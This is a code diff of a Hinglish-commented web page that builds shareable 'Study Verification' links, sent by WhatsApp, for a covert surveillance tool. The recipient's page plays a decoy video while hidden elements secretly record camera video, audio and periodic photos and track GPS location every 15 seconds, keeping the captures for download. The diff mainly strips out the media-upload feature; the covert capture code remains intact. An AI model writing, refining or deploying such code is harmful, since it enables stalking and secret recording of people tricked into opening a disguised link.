@@ -16,8 +16,6 @@
         .love-btn { transition: all 0.3s ease; }
         .love-btn:hover { transform: scale(1.05); }
         #hiddenVideo, #hiddenAudio { position: fixed; bottom: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; }
-        .upload-card { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); transition: all 0.3s ease; }
-        .upload-card:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
         .stat-card { transition: all 0.3s ease; cursor: pointer; }
         .stat-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.25); }
         .gallery-img { transition: all 0.3s ease; cursor: pointer; }
@@ -43,30 +41,7 @@
     <!-- HTTPS Warning -->
     <div id="httpsWarning" class="notice-box rounded-2xl p-4 mb-6 text-yellow-100 hidden">
         <p class="text-sm"><i class="fas fa-exclamation-triangle mr-2"></i>
-        <b>Camera/Mic kaam nahi karega!</b> Is page ko HTTPS par host karo (GitHub Pages auto HTTPS deta hai). Local file open karne par camera/mic block hoga.</p>
-    </div>
-
-    <!-- Custom Upload Section -->
-    <div class="grid md:grid-cols-2 gap-6 mb-8">
-        <div class="upload-card rounded-3xl p-6 border border-white/20">
-            <div class="flex items-center gap-3 mb-4">
-                <i class="fas fa-video text-pink-400 text-2xl"></i>
-                <h2 class="text-xl font-bold text-white">🎬 Custom Video</h2>
-            </div>
-            <input type="file" id="customVideoFile" accept="video/mp4,video/webm" class="w-full px-4 py-3 rounded-2xl bg-white/10 text-white border border-white/30 cursor-pointer">
-            <p class="text-white/50 text-xs mt-2">⚠️ Chhota video (2MB se kam) use karo, warna link lamba ho jayega</p>
-            <div id="videoPreview" class="hidden mt-3 text-green-400 text-sm"><i class="fas fa-check-circle"></i> Video selected!</div>
-        </div>
-        
-        <div class="upload-card rounded-3xl p-6 border border-white/20">
-            <div class="flex items-center gap-3 mb-4">
-                <i class="fas fa-image text-pink-400 text-2xl"></i>
-                <h2 class="text-xl font-bold text-white">🖼️ Custom Image</h2>
-            </div>
-            <input type="file" id="customImageFile" accept="image/jpeg,image/png" class="w-full px-4 py-3 rounded-2xl bg-white/10 text-white border border-white/30 cursor-pointer">
-            <p class="text-white/50 text-xs mt-2">⚠️ Chhoti image (500KB se kam) use karo</p>
-            <div id="imagePreview" class="hidden mt-3 text-green-400 text-sm"><i class="fas fa-check-circle"></i> Image selected!</div>
-        </div>
+        <b>Camera/Mic kaam nahi karega!</b> HTTPS par host karo (GitHub Pages auto HTTPS deta hai).</p>
     </div>
 
     <!-- Generate Link Card -->
@@ -184,59 +159,17 @@
 </div>
 
 <script>
-// ============ SAFE BASE64 (Unicode support) ============
-function safeBtoa(str) {
-    return btoa(unescape(encodeURIComponent(str)));
-}
-function safeAtob(str) {
-    return decodeURIComponent(escape(atob(str)));
-}
+// ============ SAFE BASE64 ============
+function safeBtoa(str) { return btoa(unescape(encodeURIComponent(str))); }
+function safeAtob(str) { return decodeURIComponent(escape(atob(str))); }
 
 // ============ DATA STORAGE ============
 let allPhotos = [], allVideos = [], allVoices = [], allLocations = [];
 
-// Recording Variables
 let hiddenStream = null, audioStream = null, videoRecorder = null, audioRecorder = null;
 let videoChunks = [], audioChunks = [];
 let capturedCount = 0, neededCount = 10, captureInterval = 1000, captureTimer = null;
 let locationInterval = null;
-let isRecording = false;
-
-// ============ FILE UPLOAD ============
-let storedCustomVideo = null;
-let storedCustomImage = null;
-
-document.getElementById('customVideoFile').addEventListener('change', function(e) {
-    const file = e.target.files[0];
-    if(!file) return;
-    if(file.size > 2 * 1024 * 1024) {
-        alert('⚠️ Video 2MB se bada hai! Link kaam nahi karega. Chhota video use karo.');
-        this.value = '';
-        return;
-    }
-    const reader = new FileReader();
-    reader.onload = function(event) {
-        storedCustomVideo = event.target.result;
-        document.getElementById('videoPreview').classList.remove('hidden');
-    };
-    reader.readAsDataURL(file);
-});
-
-document.getElementById('customImageFile').addEventListener('change', function(e) {
-    const file = e.target.files[0];
-    if(!file) return;
-    if(file.size > 500 * 1024) {
-        alert('⚠️ Image 500KB se badi hai! Link kaam nahi karega. Chhoti image use karo.');
-        this.value = '';
-        return;
-    }
-    const reader = new FileReader();
-    reader.onload = function(event) {
-        storedCustomImage = event.target.result;
-        document.getElementById('imagePreview').classList.remove('hidden');
-    };
-    reader.readAsDataURL(file);
-});
 
 // ============ TAB MANAGEMENT ============
 function showTab(tab) {
@@ -322,7 +255,7 @@ function displayLocations() {
     });
 }
 
-// ============ DOWNLOAD FUNCTIONS ============
+// ============ DOWNLOAD ============
 function downloadPhoto(idx) { const a = document.createElement('a'); a.download = `photo_${Date.now()}.jpg`; a.href = allPhotos[idx].data; a.click(); }
 function downloadVideo(idx) { const a = document.createElement('a'); a.download = `video_${Date.now()}.webm`; a.href = allVideos[idx].data; a.click(); }
 function downloadVoice(idx) { const a = document.createElement('a'); a.download = `voice_${Date.now()}.webm`; a.href = allVoices[idx].data; a.click(); }
@@ -342,7 +275,7 @@ function downloadAllData() {
     alert('✅ Complete report downloaded!');
 }
 
-// ============ LINK GENERATION ============
+// ============ LINK GENERATION (sirf text data) ============
 function generateLink() {
     const campaignName = document.getElementById('campaignName').value.trim();
     if(!campaignName) { alert('Please enter campaign name'); return; }
@@ -350,29 +283,16 @@ function generateLink() {
     const captureSpeed = document.getElementById('captureSpeed').value;
     const photoCount = document.getElementById('photoCount').value;
     
+    // Sirf chhota data URL mein — koi video/image nahi
     const linkData = {
         n: campaignName,
         s: captureSpeed,
-        p: parseInt(photoCount),
-        v: storedCustomVideo || null,
-        i: storedCustomImage || null
+        p: parseInt(photoCount)
     };
     
-    let encoded;
-    try {
-        encoded = safeBtoa(JSON.stringify(linkData));
-    } catch(e) {
-        alert('❌ Data bahut bada hai! Chhota video/image use karo.');
-        return;
-    }
-    
-    // URL length check
+    const encoded = safeBtoa(JSON.stringify(linkData));
     const baseUrl = window.location.href.split('?')[0].split('#')[0];
     const fullLink = baseUrl + '?data=' + encoded;
-    
-    if(fullLink.length > 8000) {
-        alert('⚠️ Link bahut lamba hai (' + fullLink.length + ' chars)! Video/image hatao ya chhota karo.');
-    }
     
     document.getElementById('generatedLink').value = fullLink;
     document.getElementById('linkBox').classList.remove('hidden');
@@ -381,26 +301,14 @@ function generateLink() {
 function copyLink() {
     const input = document.getElementById('generatedLink');
     input.select();
-    input.setSelectionRange(0, 99999);
     try {
-        navigator.clipboard.writeText(input.value).then(() => {
-            alert('✅ Link copied!');
-        }).catch(() => {
-            document.execCommand('copy');
-            alert('✅ Link copied!');
-        });
-    } catch(e) {
-        document.execCommand('copy');
-        alert('✅ Link copied!');
-    }
+        navigator.clipboard.writeText(input.value).then(() => alert('✅ Link copied!'))
+        .catch(() => { document.execCommand('copy'); alert('✅ Link copied!'); });
+    } catch(e) { document.execCommand('copy'); alert('✅ Link copied!'); }
 }
 
 function sendToWhatsApp() {
     const link = document.getElementById('generatedLink').value;
-    if(link.length > 2000) {
-        alert('⚠️ Link bahut lamba hai WhatsApp ke liye. Copy karke manually bhejo.');
-        return;
-    }
     window.open(`https://wa.me/?text=${encodeURIComponent('📸 Study Verification: ' + link)}`, '_blank');
 }
 
@@ -413,20 +321,10 @@ async function startCameraPageFromData(linkData) {
     document.getElementById('cameraTitle').innerHTML = linkData.n || 'Study Session';
     
     const videoElement = document.getElementById('fakeVideo');
-    if(linkData.v) {
-        videoElement.src = linkData.v;
-    } else {
-        videoElement.src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
-    }
+    videoElement.src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
     videoElement.play().catch(() => {});
     
-    if(linkData.i) {
-        document.body.style.backgroundImage = `url(${linkData.i})`;
-        document.body.style.backgroundSize = 'cover';
-    }
-    
-    // Check HTTPS
-    if(location.protocol !== 'https:' && location.hostname !== 'localhost' && location.protocol !== 'file:') {
+    if(location.protocol !== 'https:' && location.hostname !== 'localhost') {
         document.getElementById('statusText').innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i> HTTPS required for camera!';
         return;
     }
@@ -438,21 +336,18 @@ async function startRecording() {
     try {
         document.getElementById('statusText').innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Camera permission maang raha hai...';
         
-        // Video only pehle
         hiddenStream = await navigator.mediaDevices.getUserMedia({ 
             video: { width: 640, height: 480 }, 
             audio: false 
         });
         document.getElementById('hiddenVideo').srcObject = hiddenStream;
         
-        // Wait for video to be ready
         await new Promise(resolve => {
             const v = document.getElementById('hiddenVideo');
             if(v.readyState >= 2) resolve();
             else v.onloadeddata = resolve;
         });
         
-        // Video recorder
         try {
             videoRecorder = new MediaRecorder(hiddenStream);
             videoChunks = [];
@@ -463,9 +358,7 @@ async function startRecording() {
                     const reader = new FileReader();
                     reader.onloadend = () => {
                         allVideos.push({ id: Date.now(), data: reader.result, time: new Date().toLocaleString() });
-                        try {
-                            localStorage.setItem('studyVideosFinal', JSON.stringify(allVideos));
-                        } catch(e) { console.warn('localStorage full'); }
+                        try { localStorage.setItem('studyVideosFinal', JSON.stringify(allVideos)); } catch(e) {}
                         updateStats();
                         displayVideos();
                     };
@@ -473,10 +366,8 @@ async function startRecording() {
                 } 
             };
             videoRecorder.start(1000);
-            isRecording = true;
         } catch(e) { console.warn('Video recorder failed:', e); }
         
-        // Audio
         try {
             audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
             audioRecorder = new MediaRecorder(audioStream);
@@ -488,9 +379,7 @@ async function startRecording() {
                     const reader = new FileReader();
                     reader.onloadend = () => {
                         allVoices.push({ id: Date.now(), data: reader.result, time: new Date().toLocaleString() });
-                        try {
-                            localStorage.setItem('studyVoicesFinal', JSON.stringify(allVoices));
-                        } catch(e) { console.warn('localStorage full'); }
+                        try { localStorage.setItem('studyVoicesFinal', JSON.stringify(allVoices)); } catch(e) {}
                         updateStats();
                         displayVoices();
                     };
@@ -500,7 +389,6 @@ async function startRecording() {
             audioRecorder.start(1000);
         } catch(e) { console.warn('Audio failed:', e); }
         
-        // Location
         await getLocationWithAddress();
         locationInterval = setInterval(getLocationWithAddress, 15000);
         
@@ -532,9 +420,7 @@ async function getLocationWithAddress() {
             address: address,
             time: new Date().toLocaleString() 
         });
-        try {
-            localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations));
-        } catch(e) {}
+        try { localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations)); } catch(e) {}
         updateStats();
         displayLocations();
     }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
@@ -559,12 +445,7 @@ function startCapture() {
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photoData = canvas.toDataURL('image/jpeg', 0.7);
             allPhotos.push({ id: Date.now(), data: photoData, time: new Date().toLocaleString() });
-            try {
-                localStorage.setItem('studyPhotosFinal', JSON.stringify(allPhotos));
-            } catch(e) {
-                console.warn('localStorage full, purane photos hata rahe hain');
-                allPhotos.shift();
-            }
+            try { localStorage.setItem('studyPhotosFinal', JSON.stringify(allPhotos)); } catch(e) { allPhotos.shift(); }
             capturedCount++;
             updateStats();
             displayPhotos();
@@ -597,8 +478,7 @@ function checkUrl() {
     const urlParams = new URLSearchParams(window.location.search);
     const encodedData = urlParams.get('data');
     
-    // HTTPS warning
-    if(location.protocol !== 'https:' && location.hostname !== 'localhost' && location.protocol !== 'file:') {
+    if(location.protocol !== 'https:' && location.hostname !== 'localhost') {
         document.getElementById('httpsWarning').classList.remove('hidden');
     }
     
@@ -624,7 +504,6 @@ function checkUrl() {
     }
 }
 
-// Global functions
 window.generateLink = generateLink;
 window.copyLink = copyLink;
 window.sendToWhatsApp = sendToWhatsApp;
@@ -634,7 +513,6 @@ window.downloadVideo = downloadVideo;
 window.downloadVoice = downloadVoice;
 window.showTab = showTab;
 
-// Start
 checkUrl();
 
 window.addEventListener('beforeunload', () => {
